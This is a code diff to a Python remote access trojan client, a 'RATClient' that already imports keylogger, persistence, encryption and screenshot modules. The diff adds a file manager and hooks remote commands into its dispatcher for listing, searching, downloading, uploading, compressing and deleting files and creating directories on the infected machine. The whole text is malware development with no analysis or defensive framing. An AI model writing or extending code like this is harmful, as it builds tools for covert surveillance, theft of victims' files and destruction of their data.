@@ -8,6 +8,7 @@ from encryptor import Encryptor
 from persistence import PersistenceManager
 from protocol import Protocol
 from process_manager import ProcessManager
+from file_manager import FileManager
 from keylogger import Keylogger
 from screenshotManager import take_screenshot, ScreenshotManager
 from System_info import SystemInfo
@@ -20,6 +21,7 @@ class RATClient:
         self.id_manager = ClientIdentityManager()
         self.persistence = PersistenceManager()
         self.process_manager = ProcessManager()
+        self.file_manager = FileManager()
 
 
         self.client_id = self.id_manager._get_persistent_client_id()
@@ -212,6 +214,37 @@ class RATClient:
                 result = {"privileges": self.system_info.get_privileges}
             elif action == "get_architecture_info":
                 result = {"architecture": self.system_info.get_architecture}
+            
+            # File Manager Actions
+            elif action == "list_directory":
+                result = self.file_manager.list_directory(data.get('path', '.'))
+            elif action == "download_file_chunk":
+                result = self.file_manager.download_file_chunk(
+                    data.get('file_path'),
+                    data.get('chunk_index', 0)
+                )
+            elif action == "upload_file_chunk":
+                result = self.file_manager.upload_file_chunk(
+                    data.get('file_path'),
+                    data.get('chunk_data'),
+                    data.get('chunk_index', 0),
+                    data.get('is_last', False)
+                )
+            elif action == "search_files":
+                result = self.file_manager.search_files(
+                    data.get('root_path', '.'),
+                    data.get('pattern', '*'),
+                    data.get('max_results', 50)
+                )
+            elif action == "compress_files":
+                result = self.file_manager.compress_files(
+                    data.get('files', []),
+                    data.get('output_path')
+                )
+            elif action == "delete_file":
+                result = self.file_manager.delete_file(data.get('file_path'))
+            elif action == "create_directory":
+                result = self.file_manager.create_directory(data.get('dir_path'))
             
             else:
                 result = {"error": f"Unknown process action: {action}"}
